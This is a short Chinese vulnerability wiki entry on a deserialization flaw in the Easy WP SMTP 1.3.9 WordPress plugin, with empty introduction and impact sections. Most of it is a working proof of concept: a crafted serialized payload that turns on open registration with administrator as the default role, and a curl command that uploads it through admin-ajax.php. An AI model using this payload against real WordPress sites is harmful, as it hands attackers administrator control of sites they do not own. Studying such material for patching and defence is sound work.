WordPress Plugin - Easy WP SMTP 反序列化漏洞
============================================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

我们首先搭建一个wordpress站点，安装v1.3.9版本的Easy WP
SMTP，并进行相关配置。

在以下概念验证中，我将用于swpsmtp\_import\_settings上传一个文件，该文件包含恶意的序列化有效负载，该负载将使用户能够注册（users\_can\_register）并将用户默认角色（default\_role）设置为数据库中的"管理员"。

1.创建一个文件名" /tmp/upload.txt"，并添加以下内容：

    a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}

2.上传文件

    $ curl https://0-sec.org/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

![](/Users/aresx/Documents/VulWiki/.resource/WordPressPlugin-EasyWPSMTP反序列化漏洞/media/rId24.shtml)
